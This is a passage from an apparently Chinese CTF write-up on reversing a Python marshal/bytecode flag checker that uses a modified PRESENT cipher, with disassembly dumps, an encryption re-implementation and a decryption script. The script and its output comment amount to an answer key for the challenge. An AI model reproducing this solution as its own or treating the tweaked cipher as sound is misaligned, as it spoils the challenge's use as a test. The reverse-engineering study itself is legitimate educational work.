96 BINARY_LSHIFT</span><br><span class="line">             98 LOAD_FAST                0 (key)</span><br><span class="line">            100 LOAD_CONST               5 (19)</span><br><span class="line">            102 BINARY_RSHIFT</span><br><span class="line">            104 BINARY_XOR</span><br><span class="line">            106 INPLACE_XOR</span><br><span class="line">            108 STORE_FAST               0 (key)</span><br><span class="line">            110 JUMP_ABSOLUTE           20</span><br><span class="line"></span><br><span class="line">  9     &gt;&gt;  112 LOAD_FAST                2 (roundkeys)</span><br><span class="line">            114 RETURN_VALUE</span><br><span class="line">None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</details>

<p><img src="https://s2.loli.net/2023/12/03/IOML12SXx45RyFU.png" alt="img"></p>
<p>这里也能解释为什么前面全局hook后调用encrypt(xxx)<br>结合标准roundkeys生成算法<br><img src="https://s2.loli.net/2023/12/03/Rusgx94JzwmIdvU.png" alt="img"></p>
<p>再对比字节码(通过特征参数定位)<br><img src="https://s2.loli.net/2023/12/03/OEBXFZSzy8VUcGt.png" alt="img"><br>可以发现在 <code>key ^= i &lt;&lt; 15</code> 的基础上变成了<br><code>key ^= (i&lt;&lt;15) ^ (key &gt;&gt; 19)</code><br>所以在标准代码上稍作修改:(直接搬官方的了 应该是对着字节码写的吧 网上找的都不好直接改 <del>还不如自己手搓字节码</del>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sBoxLayer_dec</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            output += Sbox_inv[( state &gt;&gt; (i*<span class="number">4</span>)) &amp; <span class="number">0xF</span>] &lt;&lt; (i*<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pLayer_dec</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            output += ((state &gt;&gt; i) &amp; <span class="number">0x01</span>) &lt;&lt; PBox_inv[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key,rounds</span>):</span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,rounds+<span class="number">1</span>,<span class="number">1</span>): </span><br><span class="line">            roundkeys.append(key &gt;&gt;<span class="number">16</span>)</span><br><span class="line">            key = ((key &amp; (<span class="number">2</span>**<span class="number">19</span>-<span class="number">1</span>)) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">            key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>)+(key &amp; (<span class="number">2</span>**<span class="number">76</span>-<span class="number">1</span>))</span><br><span class="line">            key ^= (i &lt;&lt; <span class="number">15</span>)^(key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string2number</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([<span class="built_in">ord</span>(i[c])&lt;&lt;(<span class="number">8</span>*c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#        0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f</span></span><br><span class="line">Sbox= [<span class="number">0xc</span>,<span class="number">0x5</span>,<span class="number">0x6</span>,<span class="number">0xb</span>,<span class="number">0x9</span>,<span class="number">0x0</span>,<span class="number">0xa</span>,<span class="number">0xd</span>,<span class="number">0x3</span>,<span class="number">0xe</span>,<span class="number">0xf</span>,<span class="number">0x8</span>,<span class="number">0x4</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x2</span>]</span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">PBox = [<span class="number">0</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">33</span>,<span class="number">49</span>,<span class="number">2</span>,<span class="number">18</span>,<span class="number">34</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">35</span>,<span class="number">51</span>,</span><br><span class="line">        <span class="number">4</span>,<span class="number">20</span>,<span class="number">36</span>,<span class="number">52</span>,<span class="number">5</span>,<span class="number">21</span>,<span class="number">37</span>,<span class="number">53</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">38</span>,<span class="number">54</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">39</span>,<span class="number">55</span>,</span><br><span class="line">        <span class="number">8</span>,<span class="number">24</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">9</span>,<span class="number">25</span>,<span class="number">41</span>,<span class="number">57</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">42</span>,<span class="number">58</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">43</span>,<span class="number">59</span>,</span><br><span class="line">        <span class="number">12</span>,<span class="number">28</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">45</span>,<span class="number">61</span>,<span class="number">14</span>,<span class="number">30</span>,<span class="number">46</span>,<span class="number">62</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">47</span>,<span class="number">63</span>]</span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state,roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">blocks</span>):</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = block</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds-<span class="number">1</span>):</span><br><span class="line">                state = addRoundKey(state, roundkeys[-i-<span class="number">1</span>])</span><br><span class="line">                state = pLayer_dec(state)</span><br><span class="line">                state = sBoxLayer_dec(state)</span><br><span class="line">        decipher = addRoundKey(state, roundkeys[<span class="number">0</span>])</span><br><span class="line">        flag += <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(decipher&gt;&gt;(c*<span class="number">8</span>) &amp; <span class="number">0xff</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line">decrypt(cmps)</span><br><span class="line"><span class="comment"># 83ab766012aef9934c95ed93e9822a91</span></span><br></pre></td></tr></table></figure>

<p>想了想还是自己手搓一下(练习下字节码) 把加密代码写了下:<br>还复习了几个点:</p>
<ul>
<li>INPLACE_ADD: output +&#x3D;</li>
<li>BINARY_SUBSCR 用来划分块 避免字节码产生歧义</li>
</ul>
<p>自己写的时候 发现string2number直接看字节码是不太能写出来的 但知道原理自己写一下也差不了多少</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    generateRoundkeys80(<span class="number">85354531916197809168417</span>,rounds)</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = string2number(block)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds-<span class="number">1</span>):</span><br><span class="line">            state = addRoundKey(state,roundkeys[i]) <span class="comment"># roundkeys是数组</span></span><br><span class="line">            state = sBoxLayer(state)</span><br><span class="line">            state = pLayer(state)</span><br><span class="line">        cipher = addRoundKey(state,roundkeys[-<span class="number">1</span>])</span><br><span class="line">        out.append(cipher)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state,roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state^roundkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string2number</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([<span class="built_in">ord</span>(i[c])&lt;&lt;(<span class="number">8</span>*c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sBoxLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        output += Sbox[(<span class="number">4</span>*i&gt;&gt;<span class="number">15</span>)&amp;<span class="number">15</span>]&lt;&lt;(<span class="number">4</span>*i)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        output += ((state&gt;&gt;i)&amp;<span class="number">1</span>)&lt;&lt;PBox[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key, rounds</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generate the roundkeys for a 80-bit key</span></span><br><span class="line"><span class="string">    Input:</span></span><br><span class="line"><span class="string">            key:    the key as a 80-bit integer</span></span><br><span class="line"><span class="string">            rounds: the number of rounds as an integer</span></span><br><span class="line"><span class="string">    Output: list of 64-bit roundkeys as integers&quot;&quot;&quot;</span></span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, rounds + <span class="number">1</span>):  <span class="comment"># (K1 ... K32)</span></span><br><span class="line">        <span class="comment"># rawkey: used in comments to show what happens at bitlevel</span></span><br><span class="line">        <span class="comment"># rawKey[0:64]</span></span><br><span class="line">        roundkeys.append(key &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        <span class="comment"># 1. Shift</span></span><br><span class="line">        <span class="comment"># rawKey[19:len(rawKey)]+rawKey[0:19]</span></span><br><span class="line">        key = ((key &amp; (<span class="number">2</span> ** <span class="number">19</span> - <span class="number">1</span>)) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">        <span class="comment"># 2. SBox</span></span><br><span class="line">        <span class="comment"># rawKey[76:80] = S(rawKey[76:80])</span></span><br><span class="line">        key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>) + (key &amp; (<span class="number">2</span> ** <span class="number">76</span> - <span class="number">1</span>))</span><br><span class="line">        <span class="comment">#3. Salt</span></span><br><span class="line">        <span class="comment">#rawKey[15:20] ^ i</span></span><br><span class="line">        key ^= (i &lt;&lt; <span class="number">15</span>)^(key&gt;&gt;<span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br></pre></td></tr></table></figure>

<p>最后放一份手脱marshal的大致字节码:</p>
<details>
<summary>点击查看代码</summary>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  3           0 LOAD_CONST               0 (12)</span><br><span class="line">              2 LOAD_CONST               1 (5)</span><br><span class="line">              4 LOAD_CONST               2 (6)</span><br><span class="line">              6 LOAD_CONST               3 (11)</span><br><span class="line">              8 LOAD_CONST               4 (9)</span><br><span class="line">             10 LOAD_CONST               5 (0)</span><br><span class="line">             12 LOAD_CONST               6 (10)</span><br><span class="line">             14 LOAD_CONST               7 (13)</span><br><span class="line">             16 LOAD_CONST               8 (3)</span><br><span class="line">             18 LOAD_CONST               9 (14)</span><br><span class="line">             20 LOAD_CONST              10 (15)</span><br><span class="line">             22 LOAD_CONST              11 (8)</span><br><span class="line">             24 LOAD_CONST              12 (4)</span><br><span class="line">             26 LOAD_CONST              13 (7)</span><br><span class="line">             28 LOAD_CONST              14 (1)</span><br><span class="line">             30 LOAD_CONST              15 (2)</span><br><span class="line">             32 BUILD_LIST              16</span><br><span class="line">             34 STORE_NAME               0 (Sbox)</span><br><span class="line"></span><br><span class="line">  4          36 LOAD_CONST              16 (&lt;code object &lt;listcomp&gt; at 0x7f7b29b00a80, file &quot;&quot;, line 4&gt;)</span><br><span class="line">             38 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">             40 MAKE_FUNCTION            0</span><br><span class="line">             42 LOAD_NAME                1 (range)</span><br><span class="line">             44 LOAD_CONST              18 (16)</span><br><span class="line">             46 CALL_FUNCTION            1</span><br><span class="line">             48 GET_ITER</span><br><span class="line">             50 CALL_FUNCTION            1</span><br><span class="line">             52 STORE_NAME               2 (Sbox_inv)</span><br><span class="line"></span><br><span class="line">  5          54 LOAD_CONST               5 (0)</span><br><span class="line">             56 LOAD_CONST              18 (16)</span><br><span class="line">             58 LOAD_CONST              19 (32)</span><br><span class="line">             60 LOAD_CONST              20 (48)</span><br><span class="line">             62 LOAD_CONST              14 (1)</span><br><span class="line">             64 LOAD_CONST              21 (17)</span><br><span class="line">             66 LOAD_CONST              22 (33)</span><br><span class="line">             68 LOAD_CONST              23 (49)</span><br><span class="line">             70 LOAD_CONST              15 (2)</span><br><span class="line">             72 LOAD_CONST              24 (18)</span><br><span class="line">             74 LOAD_CONST              25 (34)</span><br><span class="line">             76 LOAD_CONST              26 (50)</span><br><span class="line">             78 LOAD_CONST               8 (3)</span><br><span class="line">             80 LOAD_CONST              27 (19)</span><br><span class="line">             82 LOAD_CONST              28 (35)</span><br><span class="line">             84 LOAD_CONST              29 (51)</span><br><span class="line"></span><br><span class="line">  6          86 LOAD_CONST              12 (4)</span><br><span class="line">             88 LOAD_CONST              30 (20)</span><br><span class="line">             90 LOAD_CONST              31 (36)</span><br><span class="line">             92 LOAD_CONST              32 (52)</span><br><span class="line">             94 LOAD_CONST               1 (5)</span><br><span class="line">             96 LOAD_CONST              33 (21)</span><br><span class="line">             98 LOAD_CONST              34 (37)</span><br><span class="line">            100 LOAD_CONST              35 (53)</span><br><span class="line">            102 LOAD_CONST               2 (6)</span><br><span class="line">            104 LOAD_CONST              36 (22)</span><br><span class="line">            106 LOAD_CONST              37 (38)</span><br><span class="line">            108 LOAD_CONST              38 (54)</span><br><span class="line">            110 LOAD_CONST              13 (7)</span><br><span class="line">            112 LOAD_CONST              39 (23)</span><br><span class="line">            114 LOAD_CONST              40 (39)</span><br><span class="line">            116 LOAD_CONST              41 (55)</span><br><span class="line"></span><br><span class="line">  7         118 LOAD_CONST              11 (8)</span><br><span class="line">            120 LOAD_CONST              42 (24)</span><br><span class="line">            122 LOAD_CONST              43 (40)</span><br><span class="line">            124 LOAD_CONST              44 (56)</span><br><span class="line">            126 LOAD_CONST               4 (9)</span><br><span class="line">            128 LOAD_CONST              45 (25)</span><br><span class="line">            130 LOAD_CONST              46 (41)</span><br><span class="line">            132 LOAD_CONST              47 (57)</span><br><span class="line">            134 LOAD_CONST               6 (10)</span><br><span class="line">            136 LOAD_CONST              48 (26)</span><br><span class="line">            138 LOAD_CONST              49 (42)</span><br><span class="line">            140 LOAD_CONST              50 (58)</span><br><span class="line">            142 LOAD_CONST               3 (11)</span><br><span class="line">            144 LOAD_CONST              51 (27)</span><br><span class="line">            146 LOAD_CONST              52 (43)</span><br><span class="line">            148 LOAD_CONST              53 (59)</span><br><span class="line"></span><br><span class="line">  8         150 LOAD_CONST               0 (12)</span><br><span class="line">            152 LOAD_CONST              54 (28)</span><br><span class="line">            154 LOAD_CONST              55 (44)</span><br><span class="line">            156 LOAD_CONST              56 (60)</span><br><span class="line">            158 LOAD_CONST               7 (13)</span><br><span class="line">            160 LOAD_CONST              57 (29)</span><br><span class="line">            162 LOAD_CONST              58 (45)</span><br><span class="line">            164 LOAD_CONST              59 (61)</span><br><span class="line">            166 LOAD_CONST               9 (14)</span><br><span class="line">            168 LOAD_CONST              60 (30)</span><br><span class="line">            170 LOAD_CONST              61 (46)</span><br><span class="line">            172 LOAD_CONST              62 (62)</span><br><span class="line">            174 LOAD_CONST              10 (15)</span><br><span class="line">            176 LOAD_CONST              63 (31)</span><br><span class="line">            178 LOAD_CONST              64 (47)</span><br><span class="line">            180 LOAD_CONST              65 (63)</span><br><span class="line"></span><br><span class="line">  5         182 BUILD_LIST              64</span><br><span class="line">            184 STORE_NAME               3 (PBox)</span><br><span class="line"></span><br><span class="line">  9         186 LOAD_CONST              66 (&lt;code object &lt;listcomp&gt; at 0x7f7b29a76a80, file &quot;&quot;, line 9&gt;)</span><br><span class="line">            188 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">            190 MAKE_FUNCTION            0</span><br><span class="line">            192 LOAD_NAME                1 (range)</span><br><span class="line">            194 LOAD_CONST              67 (64)</span><br><span class="line">            196 CALL_FUNCTION            1</span><br><span class="line">            198 GET_ITER</span><br><span class="line">            200 CALL_FUNCTION            1</span><br><span class="line">            202 STORE_NAME               4 (PBox_inv)</span><br><span class="line"></span><br><span class="line"> 11         204 LOAD_NAME                5 (marshal)</span><br><span class="line">            206 LOAD_METHOD              6 (loads)</span><br><span class="line">              2           0 LOAD_CONST               0 (&lt;code object addRoundKey at 0x7f5223878a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;addRoundKey&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (addRoundKey)</span><br><span class="line"></span><br><span class="line">  5           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object sBoxLayer at 0x7fab1d117a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;sBoxLayer&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (sBoxLayer)</span><br><span class="line"></span><br><span class="line">  8           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object pLayer at 0x7f023882ba80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;pLayer&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (pLayer)</span><br><span class="line"></span><br><span class="line">  8           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object string2number at 0x7f7370421a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;string2number&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (string2number)</span><br><span class="line"></span><br><span class="line">  5           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object generateRoundkeys80 at 0x7f133db26a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;generateRoundkeys80&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (generateRoundkeys80)</span><br><span class="line"></span><br><span class="line"> 11           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object encrypt at 0x7f57c4c3aa80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;encrypt&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (encrypt)</span><br><span class="line"></span><br><span class="line"> 16           8 LOAD_NAME                1 (input)</span><br><span class="line">             10 LOAD_CONST               2 (&#x27;pls input ur flag:&#x27;)</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             14 STORE_NAME               2 (inp)</span><br><span class="line"></span><br><span class="line"> 17          16 LOAD_NAME                3 (len)</span><br><span class="line">             18 LOAD_NAME                2 (inp)</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 LOAD_CONST               3 (32)</span><br><span class="line">             24 COMPARE_OP               3 (!=)</span><br><span class="line">             26 POP_JUMP_IF_FALSE       44</span><br><span class="line"></span><br><span class="line"> 18          28 LOAD_NAME                4 (print)</span><br><span class="line">             30 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">             32 CALL_FUNCTION            1</span><br><span class="line">             34 POP_TOP</span><br><span class="line"></span><br><span class="line"> 19          36 LOAD_NAME                5 (exit)</span><br><span class="line">             38 LOAD_CONST               5 (0)</span><br><span class="line">             40 CALL_FUNCTION            1</span><br><span class="line">             42 POP_TOP</span><br><span class="line"></span><br><span class="line"> 20     &gt;&gt;   44 LOAD_NAME                2 (inp)</span><br><span class="line">             46 LOAD_CONST               6 (None)</span><br><span class="line">             48 LOAD_CONST               7 (8)</span><br><span class="line">             50 BUILD_SLICE              2</span><br><span class="line">             52 BINARY_SUBSCR</span><br><span class="line">             54 LOAD_NAME                2 (inp)</span><br><span class="line">             56 LOAD_CONST               7 (8)</span><br><span class="line">             58 LOAD_CONST               8 (16)</span><br><span class="line">             60 BUILD_SLICE              2</span><br><span class="line">             62 BINARY_SUBSCR</span><br><span class="line">             64 LOAD_NAME                2 (inp)</span><br><span class="line">             66 LOAD_CONST               8 (16)</span><br><span class="line">             68 LOAD_CONST               9 (24)</span><br><span class="line">             70 BUILD_SLICE              2</span><br><span class="line">             72 BINARY_SUBSCR</span><br><span class="line">             74 LOAD_NAME                2 (inp)</span><br><span class="line">             76 LOAD_CONST               9 (24)</span><br><span class="line">             78 LOAD_CONST               3 (32)</span><br><span class="line">             80 BUILD_SLICE              2</span><br><span class="line">             82 BINARY_SUBSCR</span><br><span class="line">             84 BUILD_LIST               4</span><br><span class="line">             86 STORE_NAME               6 (blocks)</span><br><span class="line"></span><br><span class="line"> 21          88 LOAD_CONST              10 (120617461261311902)</span><br><span class="line">             90 LOAD_CONST              11 (16357837616839286114)</span><br><span class="line">             92 LOAD_CONST              12 (312508749794633008)</span><br><span class="line">             94 LOAD_CONST              13 (1843701600916795272)</span><br><span class="line">             96 BUILD_LIST               4</span><br><span class="line">             98 STORE_NAME               7 (cmps)</span><br><span class="line"></span><br><span class="line"> 22         100 LOAD_NAME                0 (encrypt)</span><br><span class="line">            102 LOAD_NAME                6 (blocks)</span><br><span class="line">            104 CALL_FUNCTION            1</span><br><span class="line">            106 STORE_NAME               8 (out_blocks)</span><br><span class="line"></span><br><span class="line"> 23         108 LOAD_NAME                9 (range)</span><br><span class="line">            110 LOAD_CONST              14 (4)</span><br><span class="line">            112 CALL_FUNCTION            1</span><br><span class="line">            114 GET_ITER</span><br><span class="line">        &gt;&gt;  116 FOR_ITER                36 (to 154)</span><br><span class="line">            118 STORE_NAME              10 (i)</span><br><span class="line"></span><br><span class="line"> 24         120 LOAD_NAME                7 (cmps)</span><br><span class="line">            122 LOAD_NAME               10 (i)</span><br><span class="line">            124 BINARY_SUBSCR</span><br><span class="line">            126 LOAD_NAME                8 (out_blocks)</span><br><span class="line">            128 LOAD_NAME               10 (i)</span><br><span class="line">            130 BINARY_SUBSCR</span><br><span class="line">            132 COMPARE_OP               3 (!=)</span><br><span class="line">            134 POP_JUMP_IF_FALSE      116</span><br><span class="line"></span><br><span class="line"> 25         136 LOAD_NAME                4 (print)</span><br><span class="line">            138 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">            140 CALL_FUNCTION            1</span><br><span class="line">            142 POP_TOP</span><br><span class="line"></span><br><span class="line"> 26         144 LOAD_NAME                5 (exit)</span><br><span class="line">            146 LOAD_CONST               5 (0)</span><br><span class="line">            148 CALL_FUNCTION            1</span><br><span class="line">            150 POP_TOP</span><br><span class="line">            152 JUMP_ABSOLUTE          116</span><br><span class="line"></span><br><span class="line"> 27     &gt;&gt;  154 LOAD_NAME                4 (print)</span><br><span class="line">            156 LOAD_CONST              15 (&#x27;Correct!&#x27;)</span><br><span class="line">            158 CALL_FUNCTION            1</span><br><span class="line">            160 POP_TOP</span><br><span class="line">            162 LOAD_CONST               6 (None)</span><br><span class="line">            164 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object encrypt at 0x7f57c4c3aa80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (32)</span><br><span class="line">              2 STORE_FAST               1 (rounds)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (generateRoundkeys80)</span><br><span class="line">              6 LOAD_CONST               2 (85354531916197809168417)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 CALL_FUNCTION            2</span><br><span class="line">             12 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  5          14 BUILD_LIST               0</span><br><span class="line">             16 STORE_FAST               3 (out)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_FAST                0 (blocks)</span><br><span class="line">             20 GET_ITER</span><br><span class="line">        &gt;&gt;   22 FOR_ITER                84 (to 108)</span><br><span class="line">             24 STORE_FAST               4 (block)</span><br><span class="line"></span><br><span class="line">  7          26 LOAD_GLOBAL              1 (string2number)</span><br><span class="line">             28 LOAD_FAST                4 (block)</span><br><span class="line">             30 CALL_FUNCTION            1</span><br><span class="line">             32 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line">  8          34 LOAD_GLOBAL              2 (range)</span><br><span class="line">             36 LOAD_FAST                1 (rounds)</span><br><span class="line">             38 LOAD_CONST               3 (1)</span><br><span class="line">             40 BINARY_SUBTRACT</span><br><span class="line">             42 CALL_FUNCTION            1</span><br><span class="line">             44 GET_ITER</span><br><span class="line">        &gt;&gt;   46 FOR_ITER                34 (to 82)</span><br><span class="line">             48 STORE_FAST               6 (i)</span><br><span class="line"></span><br><span class="line">  9          50 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             52 LOAD_FAST                5 (state)</span><br><span class="line">             54 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             56 LOAD_FAST                6 (i)</span><br><span class="line">             58 BINARY_SUBSCR</span><br><span class="line">             60 CALL_FUNCTION            2</span><br><span class="line">             62 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 10          64 LOAD_GLOBAL              4 (sBoxLayer)</span><br><span class="line">             66 LOAD_FAST                5 (state)</span><br><span class="line">             68 CALL_FUNCTION            1</span><br><span class="line">             70 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 11          72 LOAD_GLOBAL              5 (pLayer)</span><br><span class="line">             74 LOAD_FAST                5 (state)</span><br><span class="line">             76 CALL_FUNCTION            1</span><br><span class="line">             78 STORE_FAST               5 (state)</span><br><span class="line">             80 JUMP_ABSOLUTE           46</span><br><span class="line"></span><br><span class="line"> 12     &gt;&gt;   82 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             84 LOAD_FAST                5 (state)</span><br><span class="line">             86 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             88 LOAD_CONST               4 (-1)</span><br><span class="line">             90 BINARY_SUBSCR</span><br><span class="line">             92 CALL_FUNCTION            2</span><br><span class="line">             94 STORE_FAST               7 (cipher)</span><br><span class="line"></span><br><span class="line"> 13          96 LOAD_FAST                3 (out)</span><br><span class="line">             98 LOAD_METHOD              6 (append)</span><br><span class="line">            100 LOAD_FAST                7 (cipher)</span><br><span class="line">            102 CALL_METHOD              1</span><br><span class="line">            104 POP_TOP</span><br><span class="line">            106 JUMP_ABSOLUTE           22</span><br><span class="line"></span><br><span class="line"> 14     &gt;&gt;  108 LOAD_FAST                3 (out)</span><br><span class="line">            110 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line"> 12          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span 